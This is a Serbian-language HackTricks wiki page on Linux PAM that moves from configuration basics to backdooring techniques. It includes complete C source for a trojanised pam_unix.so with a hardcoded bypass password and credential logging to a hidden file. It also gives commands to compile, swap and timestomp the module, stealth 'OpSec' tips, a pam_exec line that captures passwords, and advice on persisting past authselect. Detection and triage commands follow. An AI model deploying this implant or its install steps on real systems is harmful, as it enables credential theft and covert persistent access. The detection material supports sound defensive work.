# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** deluje kao bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim servisima**, kontrolišući njihov pristup na osnovu različitih kriterijuma. Sličan je digitalnom čuvaru kapije koji obezbeđuje da samo autorizovani korisnici mogu da koriste određene servise, uz potencijalno ograničavanje njihovog korišćenja kako bi se sprečilo preopterećenje sistema.

#### Konfiguracione datoteke

- **Solaris** podržava zastarelu centralnu datoteku `/etc/pam.conf`, ali aktuelne smernice daju prednost servisnim datotekama u direktorijumu `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux sistemi** daju prednost pristupu zasnovanom na direktorijumu, tako što konfiguracije specifične za servise čuvaju u `/etc/pam.d`. Na primer, konfiguraciona datoteka za login servis nalazi se na `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Primer PAM konfiguracije za login servis mogao bi da izgleda ovako:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM oblasti upravljanja**

Ove oblasti, odnosno grupe za upravljanje, obuhvataju **auth**, **account**, **password** i **session**, pri čemu je svaka odgovorna za različite aspekte procesa autentikacije i upravljanja sesijom:<sup>[[1]](#references)</sup>

- **Auth**: Proverava identitet korisnika, često zahtevajući unos lozinke.
- **Account**: Upravljaja proverom naloga, uključujući uslove kao što su članstvo u grupi ili ograničenja prema dobu dana.
- **Password**: Upravljaja ažuriranjem lozinke, uključujući proveru složenosti ili sprečavanje dictionary attacks.
- **Session**: Upravljaja radnjama pri pokretanju ili završetku servisne sesije, kao što su montiranje direktorijuma ili postavljanje ograničenja resursa.

#### **PAM kontrole modula**

Kontrole određuju reakciju modula na uspeh ili neuspeh i utiču na celokupan proces autentikacije. One obuhvataju:<sup>[[1]](#references)</sup>

- **Required**: Neuspeh obaveznog modula dovodi do konačnog neuspeha, ali tek nakon provere svih narednih modula.
- **Requisite**: Neposredno prekidanje procesa nakon neuspeha.
- **Sufficient**: Ako nijedan prethodni `required` modul nije doživeo neuspeh, uspeh se odmah vraća i preostali moduli u istoj grupi za upravljanje se preskaču.
- **Optional**: Dovodi do neuspeha samo ako je jedini modul u stack-u.

#### Semantika važna za ofanzivne operacije

Prilikom analiziranja ili menjanja PAM-a, **lokacija ubačenog pravila** određuje koji ga stack učitava:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` i `substack` preuzimaju pravila iz drugih fajlova, pa izmena datoteke `sshd` može uticati samo na SSH, dok izmena datoteke `system-auth`, `common-auth` ili drugog deljenog stack-a može istovremeno uticati na više servisa.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM takođe podržava kontrole u uglastim zagradama, kao što je `[success=1 default=ignore]`. One se mogu zloupotrebiti za **preskakanje jednog ili više modula** nakon uspešne prilagođene provere, umesto vidljive zamene modula `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` može biti **apsolutna putanja** (`/usr/lib/security/pam_custom.so`) ili **relativna putanja** u odnosu na podrazumevani direktorijum PAM modula. Na modernim Linux sistemima stvarni direktorijumi su često `/lib/security`, `/lib64/security`, `/usr/lib/security` ili multiarch putanje kao što je `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kratak zaključak za operatera: uvek mapirajte **potpuni graf servisa** pre patching-a. Na primer, `sshd -> password-auth -> system-auth` na nekim distroima ili `sshd -> system-remote-login -> system-login -> system-auth` na drugima znači da isti implant u jednoj liniji može imati mnogo širi uticaj nego što je planirano.<sup>[[1]](#references)[[13]](#references)</sup>

#### Primer scenarija

U postavci sa više auth modula, proces prati strogo definisan redosled. Ako modul `pam_securetty` utvrdi da terminal za prijavljivanje nije autorizovan, prijavljivanje kao root je blokirano, ali se svi moduli i dalje obrađuju zbog njegovog statusa "required". Modul `pam_env` postavlja promenljive okruženja, što potencijalno poboljšava korisničko iskustvo. Moduli `pam_ldap` i `pam_unix` zajedno autentikuju korisnika, pri čemu `pam_unix` pokušava da upotrebi prethodno prosleđenu lozinku, čime se poboljšavaju efikasnost i fleksibilnost metoda autentikacije.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Klasičan persistence trik u visokovrednim Linux okruženjima jeste **zamena legitimne PAM biblioteke trojanised drop-in bibliotekom**. Na hostu čiji PAM stack učitava `pam_unix.so`, SSH ili autentikacija preko konzole mogu pozvati njegovu ulaznu tačku `pam_sm_authenticate()`; zlonamerna zamena može prikupljati credentiale ili implementirati *magic* zaobilaženje lozinke.<sup>[[2]](#references)[[11]](#references)</sup>

### Cheatsheet za kompajliranje
Skica u nastavku koristi Linux-PAM-ovu servisnu ulaznu tačku `pam_sm_authenticate()` i `pam_get_authtok()` za pristup authentication token-u.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Primer `pam_unix.so` trojana</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compile and stealth-replace (obrazac replacement/timestomp dokumentovao je Unit 42). Prilagodite i putanju do backup-a hardkodovanu u wrapper-u i komande u nastavku stvarnom direktorijumu PAM modula na targetu:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Saveti
1. **Atomic overwrite** – upišite kompletnu biblioteku u privremenu datoteku i preimenujte je na odredište kako biste izbegli ostavljanje delimično upisanog authentication modula.
2. Putanja kao što je `/usr/bin/.dbus.log` uočena je u Unit 42 AuthDoor analizi, pa je takođe koristan hunting indikator.<sup>[[2]](#references)</sup>
3. Očuvajte entry point-e koje očekuje PAM stack (na primer, `pam_sm_authenticate` i `pam_sm_setcred`) kako bi ostale management operacije nastavile da rade.<sup>[[11]](#references)[[18]](#references)</sup>

### Detekcija
Za provere integriteta paketa, RPM verifikuje metapodatke instaliranih datoteka, `debsums -s` prijavljuje greške kontrolnih suma, a `dpkg -S` u triage bloku proverava vlasništvo nad paketima; audit watch sintaksa beleži upisivanja i promene atributa na putanji.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Uporedite MD5/SHA256 vrednosti za `pam_unix.so` sa distro paketom.
* Koristite `rpm -V pam` ili `debsums -s libpam-modules` da biste uočili zamenjene biblioteke bez ručnog računanja hash vrednosti.
* Proverite da li unutar `/lib/security/` postoje datoteke sa world-writable dozvolama ili neuobičajenim vlasništvom.
* `auditd` pravilo: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije za neočekivane module: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Komande za brzi triage (nakon compromise-a ili tokom threat hunting-a)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Zloupotreba `pam_exec` za persistence
Umesto zamene `pam_unix.so`, manje invazivan pristup je dodavanje `pam_exec` linije u `/etc/pam.d/sshd`, tako da poziv koji dođe do te PAM linije pokrene pomoćni program, uz očuvanje normalnog steka.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` prima PAM metapodatke u promenljivama okruženja kao što su `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Uz `expose_authtok`, pomoćni program može da pročita do `PAM_MAX_RESP_SIZE` bajtova lozinke iz `stdin` tokom faza `auth` ili `password`. Ako želite da se pomoćni program pokrene sa efektivnim UID-om umesto stvarnog UID-a, dodajte `seteuid`.<sup>[[4]](#references)</sup>

Praktične napomene odnose se na tipove modula i filter `type=`, dokumentovane za `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` je bolji za **radnje nakon prijavljivanja**, kao što su ponovno otvaranje socket-a ili pokretanje odvojenog daemon-a.
- `auth optional pam_exec.so quiet expose_authtok ...` je uobičajen izbor za **hvatanje akreditiva**, jer se izvršava pre otvaranja sesije.
- `type=session` ili `type=auth` mogu da se koriste za ograničavanje izvršavanja na određenu PAM fazu i izbegavanje bučnog dvostrukog izvršavanja.

### Preživljavanje distro alata: `authselect`

Na RHEL i Fedora-family sistemima koji koriste `authselect`, direktne izmene generisanih datoteka kao što su `/etc/pam.d/system-auth` ili `/etc/pam.d/password-auth` mogu biti **prepisane pomoću `authselect`**. Radi postojanosti, operateri često izmene aktivni custom profil u okviru `/etc/authselect/custom/<profile>/`, a zatim ga ponovo izaberu.<sup>[[5]](#references)[[19]](#references)</sup>

Tipičan tok rada kada imate root pristup:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Ovo je važno i za napad i za trijažu: ako `/etc/pam.d/system-auth` sadrži baner `Generated by authselect` i `Do not modify this file manually`, stvarna tačka persistence-a može biti u direktorijumu `/etc/authselect/custom/`, a ne u `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Nedavno uočeni tradecraft

Nedavni izveštaji iz 2025. o **Plague** Linux backdoor-u pokazali su da je ista osnovna ideja dodatno razvijena: zlonamerni PAM komponent sa **static bypass password**, uz čišćenje SSH povezanih promenljivih okruženja i istorije shell-a (`HISTFILE=/dev/null`) radi smanjenja tragova sesije nakon prijavljivanja.<sup>[[3]](#references)</sup> To je koristan hunting obrazac jer logika backdoor-a može biti smeštena u PAM-u, dok se stealth artefakti pojavljuju tek **nakon** uspešne autentifikacije.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Priručnik covert operatora: infiltracija globalnih telekomunikacionih mreža - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Novootkriveni PAM-based backdoor za Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurisanje autentifikacije korisnika pomoću authselect-a - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian stranice priručnika](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian stranice priručnika](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Upravljanje autentifikacijom u Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Vodič za autentifikaciju na nivou sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu lista datoteka paketa: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian stranice priručnika](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Izmene/Obavezni authselect - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
